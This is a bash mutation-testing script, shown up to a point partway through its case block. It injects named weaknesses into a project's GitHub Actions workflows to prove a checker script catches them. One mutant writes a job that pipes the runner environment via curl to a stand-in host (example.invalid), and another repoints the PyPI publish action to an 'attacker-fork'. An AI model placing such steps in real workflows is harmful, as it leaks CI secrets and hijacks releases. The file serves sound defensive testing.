#!/usr/bin/env bash
# Apply one named mutation to the real workflow tree, for proving that
# scripts/check_workflows.py actually kills it.
#
# THE LIST BELOW IS THE SINGLE SOURCE. The verification loop in
# .consiliency/evidence/mutation-189.md consumes `--list` verbatim rather than
# repeating the names, and tests/test_workflow_guards.py asserts that every
# mutant it exercises appears here. Four consecutive revisions of the plan
# shipped a mutant list that disagreed with the loop that was supposed to run
# it; reading the set from one place is the fix for that.
#
# The set is the explicit UNION of every case any acceptance criterion needs:
# the release invariants, the timeout invariants, the drift cases, the
# step-level and both-levels-of-permissions cases, and — deliberately — the
# cases that are NOT covered, so the evidence can name them individually and
# show their real green exit code instead of quietly omitting them.
#
#   --list   name|expected_exit|expected_reason_tags|description
#
# expected_exit is what `check_workflows.py --base-ref <pre-mutant commit>`
# must return. expected_reason_tags names which check must report it, so a
# mutant killed by the wrong check (e.g. drift silently dead while the
# invariants cover for it) is a loop failure, not a pass.
#
# Usage:
#   scripts/_mutate_workflow.sh --list
#   scripts/_mutate_workflow.sh <name>       # mutates the working tree
#
# Every edit asserts its anchor matches EXACTLY ONCE, so an anchor that drifts
# out of the file fails loudly instead of applying nothing and reporting a
# comfortable green.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RELEASE="${REPO_ROOT}/.github/workflows/release.yml"
TEST_WF="${REPO_ROOT}/.github/workflows/test.yml"
MAINTENANCE="${REPO_ROOT}/.github/workflows/maintenance.yml"
COMPOSITE="${REPO_ROOT}/.github/actions/pipeline-bootstrap-setup/action.yml"
DOCKER_WF="${REPO_ROOT}/.github/workflows/docker.yml"
IMAGE_WF="${REPO_ROOT}/.github/workflows/image.yml"
WATCH_WF="${REPO_ROOT}/.github/workflows/image-watch.yml"
CHECKER="${REPO_ROOT}/scripts/check_workflows.py"
WHEEL_WF="${REPO_ROOT}/.github/workflows/published-wheel.yml"
# A form-valid 40-hex pin built at runtime: a literal here would trip
# test_no_pin_anchor_hardcodes_a_real_sha, and the [image] checks never read
# the commit of an injected action.
FAKE_SHA="$(printf 'f%.0s' $(seq 1 40))"

MUTANTS="$(
	cat <<'TSV'
tag-case|1|[release]|release.yml: tag filter "v*" -> "V*"; workflow stays valid and simply never runs at tag push
tags-deleted|1|[release]|release.yml: push.tags replaced by push.branches; the release trigger is gone
trigger-pull-request-added|1|[release]|release.yml: pull_request added ALONGSIDE the tag trigger; trusted publishing (id-token: write, no environment protection rules) becomes reachable from any same-repo PR
trigger-push-branches-added|1|[release]|release.yml: push.branches [main] added alongside push.tags; combined filters fire for either ref type, so every ordinary push to main reaches the publish path
trigger-workflow-dispatch-added|1|[release]|release.yml: workflow_dispatch added; struck as dangerous during #187, and it makes the publish path manually reachable from any branch
trigger-paths-filter-added|1|[release]|release.yml: a paths filter added under push alongside tags
env-dropped|1|[release]|release.yml: environment: release removed from publish
env-renamed|1|[release]|release.yml: environment: release -> dev; GitHub auto-creates it, so a presence check passes
needs-build-dropped|1|[release]|release.yml: publish no longer needs build; an untested artifact can publish
needs-publish-to-build|1|[release]|release.yml: github-release needs build instead of publish; a release without a publish
continue-on-error-job|1|[release]|release.yml: continue-on-error: true on the publish JOB; tag push reports green with no publish
continue-on-error-step|1|[release]|release.yml: continue-on-error: true on the Publish to PyPI STEP; the job-level rule bypassed one level down
if-on-build-job|1|[release]|release.yml: an if: expression on the BUILD job; skipping it skips publish through needs and the tag push concludes green
continue-on-error-build-job|1|[release]|release.yml: continue-on-error: true on the build job; a failed build's artifact publishes anyway
new-tag-triggered-workflow|1|[release]|a NEW tag-triggered workflow file (release-notes.yml, contents: write) that is not release.yml: silent to the release invariants, to drift (no base version) and to release-diff-ack (which greps for release.yml)
if-on-publish-job|1|[release]|release.yml: an if: expression on the publish JOB; a skipped job reports success
if-on-publish-step|1|[release]|release.yml: an if: expression on the Publish to PyPI STEP
forked-action|1|[release]|release.yml: pypa/gh-action-pypi-publish repointed at a fork, with the release environment in scope
permissions-job-widened|1|[release]|release.yml: publish job permissions widened with contents: write
permissions-workflow-level|1|[release]|release.yml: workflow-level permissions: write-all; every job map is untouched while build is widened
job-added|1|[release]|release.yml: an extra exfil job added, carrying a valid timeout so only the job-set rule can see it
job-deleted|1|[release] [drift]|release.yml: the publish job deleted outright
file-deleted|1|[release] [drift]|release.yml deleted entirely
timeout-360|1|[timeout]|release.yml build: timeout-minutes 45 -> 360, re-creating the six-hour default #187 exists to fix
timeout-1|1|[timeout]|release.yml build: timeout-minutes 45 -> 1, killing a multi-minute job after one minute
timeout-string|1|[timeout]|release.yml build: timeout-minutes -> "not a number"
timeout-bool|1|[timeout]|release.yml build: timeout-minutes -> true (a bool is an int in Python)
timeout-deleted|1|[timeout]|release.yml build: timeout-minutes removed, restoring the 360-minute default
maintenance-deleted|1|[drift]|maintenance.yml deleted; invisible to the release and timeout invariants, which only see surviving files
changelog-job-deleted|1|[drift]|test.yml: the changelog job deleted; the file stays valid and every surviving job keeps its timeout
workflows-job-deleted|1|[drift]|test.yml: this guard's own job deleted (see the residual note in mutation-189.md)
tag-pinned-action|1|[pin]|test.yml: install-smoke's setup-node pin reverted to the mutable @v7 tag; whoever controls that tag controls what runs
sha-comment-dropped|1|[pin]|release.yml: the "# v7.0.1" comment stripped from the upload-artifact pin; the SHA is exact but unreadable and Dependabot-untrackable
sha-moved|1|[release]|release.yml: one hex digit of the pypa SHA altered; form-valid, honest-looking comment, a commit that is not the release. Only the exact allowlist sees it
pypa-rolled-back|1|[release]|release.yml: pypa pinned to v1.9.0's REAL commit with an honest "# v1.9.0" comment; 144 commits behind and below the GHSA-vxmw-7h4f-hqxh floor. Form-valid; only the exact allowlist sees it
composite-tag-pinned|1|[pin]|.github/actions/pipeline-bootstrap-setup/action.yml: setup-node pin reverted to @v4; proves the composite (id-token: write in scope) is in the scan
uses-quoted-key|1|[pin]|.github/actions/pipeline-bootstrap-setup/action.yml: the pin reverted to @v4 AND the key written as "uses":; valid YAML that GitHub runs and the line scan cannot see. Caught only by the parsed-inventory cross-check
needs-as-list|0|-|release.yml: needs: build -> needs: [build]; a legitimate equivalent form that must NOT false-positive
timeout-below-p100|0|-|NOT COVERED: release.yml build timeout-minutes 45 -> 12, inside the 10..45 band but below the release build's observed runtime (24.5 min for v3.0.0); release-diff-ack is the only control
concurrency-added|0|-|NOT COVERED by invariant: workflow-level concurrency with cancel-in-progress on release.yml; release-diff-ack covers it by label
guard-self-disabled|1|[ci-gate]|selected workflows job cannot be skipped; the independent full suite also enforces this
guard-self-disabled-nonconstant|1|[ci-gate]|selected workflows job cannot be conditionally skipped, including a nonconstant expression
guard-step-gutted|0|-|NOT COVERED by the checker: the checker step's command replaced by a no-op, since the script runs from the PR branch. Caught by the test job
bootstrap-suite-decoy|1|[ci-gate]|rename actual suite into a conditional diagnostic and add decoy
bootstrap-selected-shell|1|[ci-gate]|override the coverage verification shell
release-suite-removed|1|[release]|remove full release validation
release-coverage-drift|1|[release]|replace the full coverage command with a narrower invocation
release-audit-removed|1|[release]|remove blocking tag dependency audit
release-node-removed|1|[release]|remove explicit release Node environment
release-xml-root|1|[release]|write runner coverage data into the release source tree
release-history-shallow|1|[release]|remove full release history
release-suite-env-filter|1|[release]|filter the full suite through environment overrides
release-bundle-hidden|1|[release]|exclude the hidden verified bundle from upload
release-verifier-env|1|[release]|override downstream identity verification environment
release-notes-mutated|1|[release]|replace the step between hash verification and upload
release-artifact-unverified|1|[release]|remove publish-side archive hash verification
release-artifact-path-widened|1|[release]|publish manifest/reports alongside distributions
diagnostics-upload-raw|1|[diagnostics]|upload raw reports instead of reconstructed safe output
diagnostics-upload-ungated|1|[diagnostics]|upload despite sanitizer failure
diagnostics-sanitize-not-always|1|[diagnostics]|omit failure-path sanitization
diagnostics-retention|1|[diagnostics]|retain diagnostic artifacts beyond the approved 14 days
scope-manufactures-asset|1|[ci-gate]|FULL-only bootstrap emits an asset mode
gate-no-always|1|[ci-gate]|aggregate loses cancellation/failure evaluation
gate-missing-audit|1|[ci-gate]|P3-A aggregate omits audit dependency
test-needs-before-protection|1|[ci-gate]|pre-S suite gains a suppressible scope dependency
gate-static-needs|1|[ci-gate]|replace same-run dependency results with static success data
gate-step-false|1|[ci-gate]|skip the embedded evaluator with a YAML boolean false
gate-shell-override|1|[ci-gate]|replace the evaluator shell with a success-only shell
scope-output-rebound|1|[ci-gate]|point scope decision output at another field
scope-step-id|1|[ci-gate]|disconnect the scope output step identity
scope-force-full-unbound|1|[ci-gate]|disconnect scope restriction from the repository variable
gate-job-name|1|[ci-gate]|rename the stable required context
gate-matrix|1|[ci-gate]|make the stable gate a matrix check
workflow-shell-default|1|[ci-gate]|override the embedded shell through workflow defaults
audit-step-skipped|1|[ci-gate]|skip locked advisory verification
audit-step-best-effort|1|[ci-gate]|ignore a failed advisory verification
audit-command-omitted|1|[ci-gate]|remove actual advisory execution
test-path-filtered|1|[ci-gate]|remove Test checks from unrelated PRs through a path filter
gate-context-collision|1|[ci-gate]|let another Test job emit the aggregate name
gate-context-cross-workflow|1|[ci-gate]|let another workflow emit the aggregate name
integration-cancelled|1|[concurrency]|main validation can be cancelled by a newer event
integration-shared-group|1|[concurrency]|non-PR validation shares a pending-replacement namespace
image-docker-main-push|1|[image]|docker.yml: push to main restored; the legacy main writer trigger is back
image-docker-tag-push|1|[image] [release]|docker.yml: push.tags v* restored; the legacy tag writer trigger is back
image-docker-pull-request-target|1|[image]|docker.yml: pull_request -> pull_request_target, which runs with a write-capable token
image-docker-push-expression|1|[image]|docker.yml: build-push-action push: set back to the legacy expression
image-docker-packages-write|1|[image]|docker.yml: packages: write re-granted to build
image-docker-login|1|[image]|docker.yml: docker/login-action re-added
image-docker-cache-to|1|[image]|docker.yml: cache-to re-added
image-docker-secrets|1|[image]|docker.yml: a secrets. reference added
image-docker-extra-job|1|[image]|docker.yml: an extra job added beside build
image-tag-allowlist-docker|1|[image]|check_workflows.py: docker.yml re-added to TAG_TRIGGERED_WORKFLOWS
image-workflow-packages-write|1|[image]|image.yml: workflow-level packages: write
image-job-write-all|1|[image]|image.yml: verify-upstream permissions: write-all
image-promote-contents-dropped|1|[image]|image.yml: contents: read dropped from promote-main
image-watch-packages-write|1|[image]|image-watch.yml: packages: write on the watch job
image-job-no-permissions-image|1|[image]|image.yml: build-smoke declares no permissions
image-job-no-permissions-watch|1|[image]|image-watch.yml: the watch job declares no permissions
image-job-no-permissions-docker|1|[image]|docker.yml: build declares no permissions
image-docker-push-step|1|[image]|image.yml: docker push in build-smoke
image-buildx-push|1|[image]|image.yml: buildx --push in build-smoke
image-type-registry|1|[image]|image.yml: a type=registry output in build-smoke
image-curl-put|1|[image]|image.yml: curl -X PUT to ghcr.io in build-smoke
image-skopeo-delete|1|[image]|image.yml: skopeo delete in build-smoke
image-crane|1|[image]|image.yml: crane in build-smoke
image-oras|1|[image]|image.yml: oras in build-smoke
image-regctl|1|[image]|image.yml: regctl in build-smoke
image-podman-push|1|[image]|image.yml: podman push in build-smoke
image-buildah-push|1|[image]|image.yml: buildah push in build-smoke
image-promote-outside|1|[image]|image.yml: image_publish.py promote invoked from build-smoke
image-stray-ghcr|1|[image]|image.yml: a stray ghcr.io literal in build-smoke
image-promote-if-vars|1|[image]|image.yml: promote-main if: vars.PMCP_IMAGE_PUBLISH == 'enabled' (case-insensitive ==)
image-needs-gate-dropped|1|[image]|image.yml: gate removed from promote-main needs
image-needs-verify-dropped|1|[image]|image.yml: verify-upstream removed from promote-main needs
image-gate-lower|1|[image]|image.yml: the gate heredoc case-folds with .lower()
image-gate-literal-output|1|[image]|image.yml: gate outputs a literal open: 'yes'
image-gate-extra-step|1|[image]|image.yml: an extra echo open=yes step in gate
image-gate-literal-env|1|[image]|image.yml: the gate step env is a literal enabled
image-gate-if|1|[image]|image.yml: an if: on the gate job
image-candidate-ref-head-sha|1|[image]|image.yml: candidate checkout ref github.event.workflow_run.head_sha
image-persist-credentials|1|[image]|image.yml: candidate checkout persist-credentials: true
image-trusted-ref-main|1|[image]|image.yml: trusted checkout ref main instead of workflow_sha
image-cone-mode|1|[image]|image.yml: trusted checkout sparse-checkout-cone-mode: true
image-watch-baselines-dropped|1|[image]|image-watch.yml: the baselines sparse pattern dropped
image-gate-checkout|1|[image]|image.yml: a checkout step in gate
image-git-clone|1|[image]|image.yml: git clone in verify-upstream
image-curl-contents|1|[image]|image.yml: a curl of a /contents/ API path
image-run-head-sha|1|[image]|image.yml: workflow_run.head_sha in a run step
image-download-run-id|1|[image]|image.yml: download-artifact given a run-id
image-cancel-in-progress|1|[image]|image.yml: promote-main cancel-in-progress: true
image-trigger-push-tags|1|[image]|image.yml: push.tags added to on:
image-trigger-workflow-call|1|[image]|image.yml: workflow_call added to on:
image-trigger-schedule|1|[image]|image.yml: schedule added to on:
image-trigger-repository-dispatch|1|[image]|image.yml: repository_dispatch added to on:
image-trigger-workflow-dispatch|1|[image]|image.yml: workflow_dispatch added to on:
image-types-requested|1|[image]|image.yml: workflow_run types: [requested]
image-branches-removed|1|[image]|image.yml: workflow_run branches filter removed
image-tag-caller|1|[image]|a NEW tag-triggered workflow that calls image.yml
image-watch-push|1|[image]|image-watch.yml: push added to on:
image-watch-pull-request|1|[image]|image-watch.yml: pull_request added to on:
image-ack-docker|1|[image]|test.yml: release-diff-ack regex loses docker.yml
image-ack-image|1|[image]|test.yml: release-diff-ack regex loses image.yml
image-ack-dockerfile|1|[image]|test.yml: release-diff-ack regex loses Dockerfile
image-ack-baselines|1|[image]|test.yml: release-diff-ack regex loses the image-baselines directory
image-http-notify-put|1|[image]|maintenance.yml:notify-worker: -X POST -> -X PUT in the pinned run block; only the whole-job pin re-arms the curl/wget clause
image-http-notify-url-repointed|1|[image]|maintenance.yml:notify-worker: WORKER_URL pointed at another variable, run block untouched; only the whole-job pin sees it
image-http-notify-curlrc|1|[image]|maintenance.yml:notify-worker: a step before the notify step writes $HOME/.curlrc (request = PUT); only the whole-job pin sees it
image-http-notify-copied|1|[image]|maintenance.yml: the notify step copied into a second, unpinned job
image-http-upload-T|1|[image]|published-wheel.yml: curl -sfT (implied PUT) in a new step
image-http-data-d|1|[image]|published-wheel.yml: curl -sd (implied POST) in a new step
image-http-wget-post-file|1|[image]|published-wheel.yml: wget --post-file in a new step
image-http-step-shell|1|[image]|published-wheel.yml: a step whose shell: holds a mutating curl
image-http-defaults-shell|1|[image]|published-wheel.yml: a workflow-level defaults.run.shell holding a mutating curl
image-gate-workflow-env|1|[image]|image.yml: a workflow-level env whose BASH_ENV appends open=yes to $GITHUB_OUTPUT before the gate heredoc runs
image-gate-workflow-defaults|1|[image]|image.yml: a workflow-level defaults.run.shell that appends open=yes to $GITHUB_OUTPUT
image-http-quoted-separator|1|[image]|published-wheel.yml: curl with a quoted & in the URL, then -X PUT
image-http-attached-value|1|[image]|published-wheel.yml: curl -d@file (attached value, implied POST)
image-http-quoted-method|1|[image]|published-wheel.yml: curl -X"PUT" (quoted attached method)
image-docker-image-push|1|[image]|published-wheel.yml: docker image push, the long form of docker push
image-skopeo-smoke-glued|1|[image]|image.yml: a second skopeo glued onto the allowed smoke load with ;
image-needs-reordered|0|-|image.yml: promote-main needs reordered; an equivalent form that must NOT false-positive
TSV
)"

usage() {
	echo "usage: $0 --list | $0 <mutant-name>" >&2
}

if [ "$#" -ne 1 ]; then
	usage
	exit 2
fi

if [ "$1" = "--list" ]; then
	printf '%s\n' "$MUTANTS"
	exit 0
fi

NAME="$1"
if ! printf '%s\n' "$MUTANTS" | cut -d'|' -f1 | grep -qx -- "$NAME"; then
	echo "unknown mutant: ${NAME}" >&2
	usage
	exit 2
fi

# replace FILE OLD NEW -- OLD must occur exactly once.
replace() {
	MUT_FILE="$1" MUT_OLD="$2" MUT_NEW="$3" python3 - <<'PY'
import os
import pathlib
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
old = os.environ["MUT_OLD"]
new = os.environ["MUT_NEW"]
found = text.count(old)
if found != 1:
    sys.exit(
        f"mutation anchor matched {found} times (expected exactly 1) in {path}:\n{old!r}"
    )
path.write_text(text.replace(old, new))
PY
}

# delete_block FILE START END -- drops [START, END) ; both must occur once.
delete_block() {
	MUT_FILE="$1" MUT_START="$2" MUT_END="$3" python3 - <<'PY'
import os
import pathlib
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
lines = path.read_text().splitlines(keepends=True)
start_marker = os.environ["MUT_START"]
end_marker = os.environ["MUT_END"]
starts = [i for i, line in enumerate(lines) if line.rstrip("\n") == start_marker]
ends = [i for i, line in enumerate(lines) if line.rstrip("\n") == end_marker]
if len(starts) != 1 or len(ends) != 1:
    sys.exit(
        f"block anchors matched {len(starts)}/{len(ends)} times (expected 1/1) in {path}"
    )
start, end = starts[0], ends[0]
if end <= start:
    sys.exit(f"end anchor precedes start anchor in {path}")
path.write_text("".join(lines[:start] + lines[end:]))
PY
}

# replace_re FILE PATTERN REPL -- PATTERN (Python re, MULTILINE) must match
# exactly once; REPL may use \1 backrefs. For anchors that contain a pinned
# `uses:` line: the SHA and release comment change on every Dependabot bump,
# so a literal anchor would refuse (and silently strand the mutant) on the
# first legitimate update. Match the FORM of the pin, never its value.
replace_re() {
	MUT_FILE="$1" MUT_PATTERN="$2" MUT_REPL="$3" python3 - <<'PY'
import os
import pathlib
import re
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
pattern = re.compile(os.environ["MUT_PATTERN"], re.MULTILINE)
found = len(pattern.findall(text))
if found != 1:
    sys.exit(f"regex anchor matched {found} times (expected exactly 1) in {path}:\n{pattern.pattern!r}")
path.write_text(pattern.sub(os.environ["MUT_REPL"], text, count=1))
PY
}

# replace_after_re FILE MARKER PATTERN REPL -- MARKER (literal) exactly once;
# PATTERN exactly once after it.
replace_after_re() {
	MUT_FILE="$1" MUT_MARKER="$2" MUT_PATTERN="$3" MUT_REPL="$4" python3 - <<'PY'
import os
import pathlib
import re
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
marker = os.environ["MUT_MARKER"]
pattern = re.compile(os.environ["MUT_PATTERN"], re.MULTILINE)
if text.count(marker) != 1:
    sys.exit(f"marker matched {text.count(marker)} times (expected exactly 1) in {path}:\n{marker!r}")
head, tail = text.split(marker, 1)
found = len(pattern.findall(tail))
if found != 1:
    sys.exit(f"regex anchor matched {found} times after marker (expected exactly 1) in {path}:\n{pattern.pattern!r}")
path.write_text(head + marker + pattern.sub(os.environ["MUT_REPL"], tail, count=1))
PY
}

# flip_last_hex FILE PATTERN -- PATTERN (exactly once) must end in a capture
# group holding a hex SHA; its last digit is changed. Form-valid, wrong commit.
flip_last_hex() {
	MUT_FILE="$1" MUT_PATTERN="$2" python3 - <<'PY'
import os
import pathlib
import re
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
pattern = re.compile(os.environ["MUT_PATTERN"], re.MULTILINE)
matches = list(pattern.finditer(text))
if len(matches) != 1:
    sys.exit(f"regex anchor matched {len(matches)} times (expected exactly 1) in {path}:\n{pattern.pattern!r}")
m = matches[0]
sha = m.group(1)
flipped = sha[:-1] + ("4" if sha[-1] != "4" else "5")
start, end = m.span(1)
path.write_text(text[:start] + flipped + text[end:])
PY
}

append() {
	MUT_FILE="$1" MUT_TEXT="$2" python3 - <<'PY'
import os
import pathlib

path = pathlib.Path(os.environ["MUT_FILE"])
with path.open("a") as handle:
    handle.write(os.environ["MUT_TEXT"])
PY
}

case "$NAME" in
tag-case)
	replace "$RELEASE" '      - "v*"' '      - "V*"'
	;;
tags-deleted)
	replace "$RELEASE" '  push:
    tags:
      - "v*"
' '  push:
    branches: [main]
'
	;;
trigger-pull-request-added)
	replace "$RELEASE" 'on:
  push:
' 'on:
  pull_request: {}
  push:
'
	;;
trigger-push-branches-added)
	replace "$RELEASE" '  push:
    tags:
' '  push:
    branches: [main]
    tags:
'
	;;
trigger-workflow-dispatch-added)
	replace "$RELEASE" 'on:
  push:
' 'on:
  workflow_dispatch:
  push:
'
	;;
trigger-paths-filter-added)
	replace "$RELEASE" '  push:
    tags:
' '  push:
    paths: ["**"]
    tags:
'
	;;
env-dropped)
	replace "$RELEASE" '    environment: release
' ''
	;;
env-renamed)
	replace "$RELEASE" '    environment: release' '    environment: dev'
	;;
needs-build-dropped)
	replace "$RELEASE" '    needs: build
' ''
	;;
needs-publish-to-build)
	replace "$RELEASE" '    needs: [publish, build]' '    needs: build'
	;;
needs-as-list)
	replace "$RELEASE" '    needs: build' '    needs: [build]'
	;;
continue-on-error-job)
	replace "$RELEASE" '  publish:
    needs: build
' '  publish:
    needs: build
    continue-on-error: true
'
	;;
continue-on-error-step)
	replace_re "$RELEASE" '^(      - name: Publish to PyPI\n)(        uses: pypa/gh-action-pypi-publish@[0-9a-f]{40} # \S+\n)' \
		'\1        continue-on-error: true\n\2'
	;;
if-on-publish-job)
	replace "$RELEASE" '  publish:
    needs: build
' '  publish:
    needs: build
    if: ${{ github.actor != '"'"'nobody'"'"' }}
'
	;;
if-on-publish-step)
	replace_re "$RELEASE" '^(      - name: Publish to PyPI\n)(        uses: pypa/gh-action-pypi-publish@[0-9a-f]{40} # \S+\n)' \
		'\1        if: ${{ github.actor != '"'"'nobody'"'"' }}\n\2'
	;;
if-on-build-job)
	replace "$RELEASE" '  build:
    runs-on: ubuntu-latest
' '  build:
    if: ${{ github.actor != '"'"'nobody'"'"' }}
    runs-on: ubuntu-latest
'
	;;
continue-on-error-build-job)
	replace "$RELEASE" '  build:
    runs-on: ubuntu-latest
' '  build:
    continue-on-error: true
    runs-on: ubuntu-latest
'
	;;
new-tag-triggered-workflow)
	cat >"${REPO_ROOT}/.github/workflows/release-notes.yml" <<'YAML'
name: Release notes
on:
  push:
    tags:
      - "v*"
jobs:
  notes:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Do something at tag push
        run: echo "arbitrary code at tag push"
YAML
	;;
forked-action)
	# Keeps the SHA form and the comment, so the pin invariant passes and only
	# the exact EXPECTED_USES allowlist can see the owner change.
	replace_re "$RELEASE" 'uses: pypa/gh-action-pypi-publish@([0-9a-f]{40} # \S+)' \
		'uses: attacker-fork/gh-action-pypi-publish@\1'
	;;
permissions-job-widened)
	replace_re "$RELEASE" '(?s)(  publish:.*?    permissions:\n      id-token: write[^\n]*\n)      contents: read\n' '\1      contents: write\n'
	;;
permissions-workflow-level)
	replace "$RELEASE" '
jobs:
' '
permissions: write-all

jobs:
'
	;;
concurrency-added)
	replace "$RELEASE" '
jobs:
' '
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: true

jobs:
'
	;;
job-added)
	append "$RELEASE" '
  exfil:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: release
    steps:
      - name: Collect
        run: env | curl -sS -X POST --data-binary @- https://example.invalid/collect
'
	;;
job-deleted)
	delete_block "$RELEASE" '  publish:' '  github-release:'
	;;
file-deleted)
	rm -f "$RELEASE"
	;;
maintenance-deleted)
	rm -f "$MAINTENANCE"
	;;
changelog-job-deleted)
	delete_block "$TEST_WF" '  changelog:' '  typecheck:'
	;;
workflows-job-deleted)
	delete_block "$TEST_WF" '  workflows:' '  release-diff-ack:'
	;;
timeout-360)
	replace "$RELEASE" '    timeout-minutes: 45' '    timeout-minutes: 360'
	;;
timeout-1)
	replace "$RELEASE" '    timeout-minutes: 45' '    timeout-minutes: 1'
	;;
timeout-below-p100)
	replace "$RELEASE" '    timeout-minutes: 45' '    timeout-minutes: 12'
	;;
timeout-string)
	replace "$RELEASE" '    timeout-minutes: 45' '    timeout-minutes: "not a number"'
	;;
timeout-bool)
	replace "$RELEASE" '    timeout-minutes: 45' '    timeout-minutes: true'
	;;
timeout-deleted)
	replace "$RELEASE" '    timeout-minutes: 45
' ''
	;;
guard-self-disabled)
	replace "$TEST_WF" '  workflows:
    runs-on: ubuntu-latest
' '  workflows:
    if: ${{ false }}
    runs-on: ubuntu-latest
'
	;;
guard-self-disabled-nonconstant)
	replace "$TEST_WF" '  workflows:
    runs-on: ubuntu-latest
' '  workflows:
    if: ${{ github.actor == '"'"'nobody-at-all'"'"' }}
    runs-on: ubuntu-latest
'
	;;
tag-pinned-action)
	replace_after_re "$TEST_WF" '  install-smoke:
' '- uses: actions/setup-node@[0-9a-f]{40} # \S+' '- uses: actions/setup-node@v7'
	;;
sha-comment-dropped)
	replace_re "$RELEASE" '(uses: actions/upload-artifact@[0-9a-f]{40}) # \S+' '\1'
	;;
sha-moved)
	flip_last_hex "$RELEASE" 'uses: pypa/gh-action-pypi-publish@([0-9a-f]{40}) # \S+'
	;;
pypa-rolled-back)
	# The rollback TARGET is deliberately literal: v1.9.0's real commit, below
	# the GHSA-vxmw-7h4f-hqxh floor. The anchor is not.
	replace_re "$RELEASE" 'uses: pypa/gh-action-pypi-publish@[0-9a-f]{40} # \S+' \
		'uses: pypa/gh-action-pypi-publish@ec4db0b4ddc65acdf4bff5fa45ac92d78b56bdf0 # v1.9.0'
	;;
composite-tag-pinned)
	replace_re "$COMPOSITE" 'uses: actions/setup-node@[0-9a-f]{40} # \S+' 'uses: actions/setup-node@v4'
	;;
uses-quoted-key)
	replace_re "$COMPOSITE" '- uses: actions/setup-node@[0-9a-f]{40} # \S+' '- "uses": actions/setup-node@v4'
	;;
guard-step-gutted)
	replace "$TEST_WF" \
		'        run: uv run python scripts/check_workflows.py --base-ref "${{ steps.drift-base.outputs.base }}"' \
		'        run: echo "workflow guards skipped"'
	;;
bootstrap-suite-decoy)
	replace "$TEST_WF" '      - name: Run tests with coverage' "$(sed -n '/      - name: Upload safe reports/,+1p' "$TEST_WF")"
	replace "$TEST_WF" '      - name: Check coverage threshold' $'      - name: Run tests with coverage\n        run: echo decoy\n\n      - name: Check coverage threshold'
	;;
bootstrap-selected-shell)
	replace "$TEST_WF" '      - name: Check coverage threshold' $'      - name: Check coverage threshold\n        shell: true {0}'
	;;
release-suite-removed)
	replace "$RELEASE" "$(sed -n '/      - name: Run tests with coverage/,+1p' "$RELEASE")" ''
	;;
release-coverage-drift)
	replace_re "$RELEASE" 'run: uv run --locked python -m pytest tests/[^\n]+' 'run: uv run --locked python -m pytest tests/'
	;;
release-audit-removed)
	delete_block "$RELEASE" '      - name: Audit locked dependencies before publication' '      - name: Run tests with coverage'
	;;
release-node-removed)
	replace_re "$RELEASE" '      - uses: actions/setup-node@[0-9a-f]{40} # \S+\n        with:\n          node-version: "22"\n' ''
	;;
release-xml-root)
	replace "$RELEASE" '--cov-report=xml:"$RUNNER_TEMP/release-coverage.xml"' '--cov-report=xml'
	;;
release-history-shallow)
	replace "$RELEASE" '          fetch-depth: 0' '          fetch-depth: 1'
	;;
release-suite-env-filter)
	replace "$RELEASE" '      - name: Run tests with coverage' $'      - name: Run tests with coverage\n        env:\n          PYTEST_ADDOPTS: "-k nothing"'
	;;
release-bundle-hidden)
	replace "$RELEASE" '          include-hidden-files: true' '          include-hidden-files: false'
	;;
release-verifier-env)
	replace_re "$RELEASE" '(?s)(  publish:.*?      - name: Verify artifact identity)\n' '\1\n        env:\n          GIT_CONFIG_COUNT: "0"\n'
	;;
release-notes-mutated)
	replace_re "$RELEASE" '(?s)(      - name: Extract release notes\n        run: \|\n).*?(?=\n      - name: Create GitHub Release)' '\1          echo bypass\n'
	;;
release-artifact-unverified)
	replace_re "$RELEASE" '(?s)(  publish:.*?)(      - name: Verify artifact identity\n        run: python3 -I -B scripts/verify_release_bundle\.py \.release-bundle\n)' '\1'
	;;
release-artifact-path-widened)
	replace "$RELEASE" '          packages-dir: .release-bundle/dist/' '          packages-dir: .release-bundle/'
	;;
diagnostics-upload-raw)
	replace "$TEST_WF" '          path: .ci-reports/safe/' '          path: .ci-reports/raw/'
	;;
diagnostics-upload-ungated)
	replace "$TEST_WF" "        if: \${{ always() && steps.sanitize.outcome == 'success' && vars.PMCP_CI_DISABLE_REPORTS == '' }}" '        if: always()'
	;;
diagnostics-sanitize-not-always)
	replace "$TEST_WF" $'        id: sanitize\n        if: always()' '        id: sanitize'
	;;
diagnostics-retention)
	replace "$TEST_WF" '          retention-days: 14' '          retention-days: 90'
	;;
scope-manufactures-asset)
	replace "$TEST_WF" "'schema': 'FULL_BOOTSTRAP_V1', 'mode': 'FULL'" "'schema': 'FULL_BOOTSTRAP_V1', 'mode': 'ASSET_V1'"
	;;
gate-no-always)
	replace "$TEST_WF" $'    if: always()\n    needs: [ci-scope' '    needs: [ci-scope'
	;;
gate-missing-audit)
	replace "$TEST_WF" 'needs: [ci-scope, test, install-smoke, min-version-smoke, lint, typecheck, workflows, audit, changelog, release-diff-ack]' 'needs: [ci-scope, test, install-smoke, min-version-smoke, lint, typecheck, workflows, changelog, release-diff-ack]'
	;;
test-needs-before-protection)
	replace "$TEST_WF" $'  test:\n    runs-on:' $'  test:\n    needs: [ci-scope]\n    runs-on:'
	;;
gate-static-needs)
	replace "$TEST_WF" '          NEEDS_JSON: ${{ toJSON(needs) }}' '          NEEDS_JSON: |
            {"ci-scope":{"result":"success"},"test":{"result":"success"},"install-smoke":{"result":"success"},"min-version-smoke":{"result":"success"},"lint":{"result":"success"},"typecheck":{"result":"success"},"workflows":{"result":"success"},"audit":{"result":"success"},"changelog":{"result":"success"},"release-diff-ack":{"result":"success"}}'
	;;
gate-step-false)
	replace "$TEST_WF" '      - name: Evaluate FULL-only bootstrap and recovery contract' '      - name: Evaluate FULL-only bootstrap and recovery contract
        if: false'
	;;
gate-shell-override)
	replace "$TEST_WF" '      - name: Evaluate FULL-only bootstrap and recovery contract' '      - name: Evaluate FULL-only bootstrap and recovery contract
        shell: bash -c "exit 0" -- {0}'
	;;
scope-output-rebound)
